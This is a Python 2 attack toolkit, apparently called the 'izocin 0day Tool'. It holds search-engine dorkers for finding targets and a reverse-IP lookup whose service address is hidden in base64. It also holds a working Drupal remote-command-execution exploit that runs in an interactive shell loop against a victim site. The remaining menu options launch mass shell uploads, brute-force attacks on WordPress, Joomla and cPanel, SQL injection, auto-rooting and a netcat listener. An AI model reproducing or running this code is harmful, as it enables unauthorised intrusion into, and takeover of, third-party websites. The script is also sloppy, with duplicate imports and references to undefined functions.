import requests, re, os, base64;
from urlparse import urlparse, parse_qs
import urllib, httplib, urllib2
from platform import system
from time import sleep
from threading import Thread
import color
import time
import webbrowser
import requests, re,urllib, urllib2, os, sys, codecs,binascii, json, argparse
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
import glob
from random import sample as rand
from Queue import Queue				   		
from platform import system
from urlparse import urlparse
from optparse import OptionParser	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init

import requests, os
import time, sys
import string, random
import urllib2,urllib,re
import optparse
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from platform import system
from urllib import unquote_plus as urldecode

import cookielib, binascii, random, json
from urlparse import urlparse
from multiprocessing.dummy import Pool as ThreadPool
init(autoreset=True)
userAGE = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'
opener = urllib2.build_opener()
opener.addheaders = [('User-agent', userAGE)]
sitelist = []
comp = []

def scan(dork, tld, log):
    url = []
    result = open(log,"a")
    page = 0
    print("[+] Scanned Running By Dork : "+dork)
    while page <= 100:
        urll = "http://www.google."+tld+"/search?q="+dork+"&start="+str(page)+"&inurl=https"
        htmll = requests.get(urll).text
        if re.findall('<script src="(.*?)" async defer></script>', htmll):
            print("[-] Captcha Detect! You're Requests Blocked")
            print("[-[ Pleae Trun Off You're Connection For Change New IP Addres")
            pass
        else:
            pass
        link = re.findall(r'<h3 class="r"><a href="(.*?)"',htmll)
        for i in link:
            i=i.strip()
            o = urlparse(i, 'http')
            if i.startswith('/url?'):
                link = parse_qs(o.query)['q'][0]
                url.append(link)
                result.write(str(link+"\n"))
        page+=10
        print("["+str(len(url))+"]  Site Crawled")
    print("["+str(len(url))+"] Success Crawled All")
    
def dorker(dork,pages):
    d = urllib.quote(dork)
    p = 1
    m = pages * 10
    while p <= m:
        try:
            search = "http://www.bing.com/search?q=" + d +"&first=" + str(p)
            req = opener.open(search)
            source = req.read()
            sites = re.findall('<h2><a href="http://(.*?)"', source)
            sitelist.extend(sites)
            p += 10
        except urllib2.URLError:
            print ("url error")
            continue
        except urllib2.HTTPError:
            print ("http error")
            continue
        except IOError:
            continue
        except httplib.HTTPException:
            continue
    uniqsites = list(set(sitelist))  
    for line in uniqsites:
        sep = '/'
        build = "http://" + line.split(sep,1)[0]
        comp.append(build)
        print "\t\t" + build
    final1 = list(set(comp))
    l = "bing_search_" + str(len(final1)) + ".txt"
    foo = open(l,"w")
    for ss in final1:
        foo.write(ss + "\n")
    foo.close()
    print "[OK] file saved as " + l
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[38m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray    
def slowprint():

    url = 'http://api.hackertarget.com/reverseiplookup/?q='
    lista = raw_input(" Enter ip List : ")
    lista = open(lista,'r')
    read = lista.readlines()
    for ip in read:
     ip = ip.rstrip("\n")
     print("Scanning -> "+ip)
     curl = url+ip 
     openurl = urllib2.urlopen(curl)
     read = openurl.read()
     file = open('site.txt','a')
     file.write(read)
     file.close()
     file = open('site.txt','r')
     read = file.readlines()
     file.close()
     os.system('rm site.txt')
     for i in read:
      i = i.rstrip("\n")
      file = open('sites.txt','a')
      i = 'http://'+i
      file.write(i+"\n")
      file.close()
      print(B + " [ + ] Found -> "+O+i)
      
def exploit(command):
        
        HOST=domain
        
	get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':command, 'name[#type]':'markup'}
	post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
	r = requests.post(HOST, data=post_params, params=get_params)

	m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
	if m:
	    found = m.group(1)
	    get_params = {'q':'file/ajax/name/#value/' + found}
	    post_params = {'form_build_id':found}
	    r = requests.post(HOST, data=post_params, params=get_params)
	    print("\n".join(r.text.split("\n")[:-1]))
		
				    			
class reverse_ipz(object):
    def __init__(self):
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                   'Accept': '*/*'}
        color.cls()
        color.print_logo()
        Domorip = raw_input('     Enter Domain/IP Address: ')
        self.Reverse_ip(Domorip)
    def Reverse_ip(self, domain_Or_ipAddress):

        Check = domain_Or_ipAddress
        if Check.startswith("http://"):
            Check = Check.replace("http://", "")
        elif Check.startswith("https://"):
            Check = Check.replace("https://", "")
        else:
            pass
        try:
            ip = socket.gethostbyname(Check)
        except:
            color.domainnotvalid()
            sys.exit()
        Rev = requests.get(binascii.a2b_base64('aHR0cDovL3ZpZXdkbnMuaW5mby9yZXZlcnNlaXAvP2hvc3Q9') + ip + '&t=1',
                           headers=self.headers, timeout=5)
        Revlist = re.findall('<tr> <td>((([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}))</td>', Rev.text)
        if len(Revlist) == 1000:
            for url in Revlist:
                with open('logs/' + ip + '.txt', 'a') as xx:
                    xx.write(str(url[0]) + '\n')
            gotoBing = BingDorker()
            gotoBing.ip_bing(ip)
        else:
            color.ResultTotalDomain(str(len(Revlist)), ip)
            for url in Revlist:
                color.ResultDomain(str(url[0]))
                with open('logs/' + ip + '.txt', 'a') as xx:
                    xx.write(str(url[0]) + '\n')      


 
print("[*] izocin 0day Tool \n[*] Turkey\n\n")
print("""[izocin] List Tools :
 
     [1] Google Dorker                     [16] Wordpress Mass Shell upload Attack
     [2] Bing Dorker             	   [17] PrestaShop Mass Shell upload Attack
     [3] Reverse ip Priv8          	   [18] Drupal Mass Shell upload Attack
     [4] Drupal RCE               	   [19] Vbulletin RCE Shell upload Attack
     [5] Shell Finder                      [20] VbSeo Mass Shell upload Attack
     [6] Cms detect and exp(850 vulns)     [21] Tinymce,kcfinder,ajaxfilemenager and other 30
     [7] Private Toolbox                   [22] Private Perl Bigbang attack shell upload
     [8] nETCAT                            [23] Joomla Mass Brute Force and Shell upload
     [9] Python Sql Priv8                  [24] Wordpress Mass Brute Force
     [10] Detect Cms                       [25] Wordpress user pass shell up
     [11] Cpanel detect and brute          [26] izocin shell detect and auto rooted very priv
     [12] Sitelist ip checker              [27] izocin inbox auto mail sender[Priv]
     [13] SMTP Found                       [28] Private perl attack
     [14] config and smtp found attack     [29] Zone-h.org grabber and admin panel founder
     [15] Joomla Mass Shell upload Attack  [30] About this bot.How work.""")
tools = raw_input("\n[izocin] Select Use >>> ")

if tools == "1":
    dork = raw_input("[izocin] Input Dork : ")
    if ' ' in dork:
        dork = dork.replace(' ', '+')
    else:
        pass
    dom = "com"
    out = raw_input("[izocin] Input Output Dorking : ")
    scan(dork,dom,out)
elif tools == "2":
    print 'Type dork below:'
    dr = raw_input('')
    print 'Number of pages to look for:'
    numpages = int(raw_input(''))
    print '[>] Search in progress ...'
    dorker(dr, numpages)
elif tools == "3":
    slowprint()
elif tools == "4":
    domain=raw_input('write vitim sites plz\n')
    while True:
  
         
         command = raw_input('$ ')
         exploit(command)
elif tools == "5":
     os.system('python pentest/shellfound/shellfind.py')
elif tools == "6":
     os.system('python priv89.py')     
elif tools == "7":
     os.system('python pentest/toolbox/toolbox.py')   
elif tools == "8":
     os.system("start /wait cmd /c nc -vlp 22")
elif tools == "9":
     os.system('python pentest/sql/injector.py')
elif tools == "10":
     DeteCtor_CMS()
elif tools == "11":
     os.system('python pentest/cpanel/bruter.py 50 pentest/cpanel/domins.txt pentest/cpanel/password.txt')
elif tools == "12":
     os.system('python pentest/ips/ips.py')     
elif tools == "13":
     os.system('python pentest/smtp/smtp.py')
elif tools == "14":
     os.system('python pentest/configfound/smtp.py')
elif tools == "15":
     os.system('python pentest/Joomla/joomla.py')
elif tools == "16":
     os.system('python pentest/wordpress/wp.py')
elif tools == "17":
     os.system('python pentest/Prestashop/presta.py')
elif tools == "18":
     os.system('python pentest/drupal/drupal.py')
elif tools == "19":
     os.system('python pentest/vbulletin/vb.py')
elif tools == "20":
     os.system('python pentest/vbulletin/vbseooo.py')
elif tools == "21":
     os.system('python pentest/Unknow/unk.py')
elif tools == "22":
     os.system('perl pentest/Perl/perlbigbang/zombiy.pl')
elif tools == "23":
     os.system('python pentest/Joomla/JoomlaBrute/runn.py')
elif tools == "24":
     os.system('python pentest/wordpress/wpbrute/wpb.py')
elif tools == "25":
     os.system('python pentest/wordpress/wpbrute/wp-sud.py')
elif tools == "26":
     os.system('python pentest/rooted/rootx.py')
elif tools == "27":
     os.system('python pentest/mailcheck/mails.py')
elif tools == "28":
     os.system('perl pentest/Perl/drhex57/Zombi_5.pl')
elif tools == "29":
     os.system('python pentest/zone/zoneci.py')
elif tools == "30":
        print 'this bot work again first install you are pc python 2.7 version install:'
        print 'second cd C:\python27\scripts'
        print 'pip install requests'
        print 'pip install colorama'
        print 'and 0day.py folder cmd, and python 0daybe.py enter'
        print '..................................................'
        print 'how to use 11 <--- cpanel detect system'
        print 'pentest/cpanel folder in domins.txt <-----website list.Not write http and https only  domain name'        
        print '..................................................'
        print 'how to use 27 <--- mail checker'
        print 'write shell list name. root.php shell list and you mail adress write and\n'
        print 'you mail adress check\n'
        print '..................................................'
        print 'how to use 29 <--- zone-h.org rabber'
        print 'pentest/zone  folder in zoneci.py source open <--- phpsid and zoneh write and saved. and work'
else:
    print("[X] izocin Num "+tools+" Not Found")
    exit()
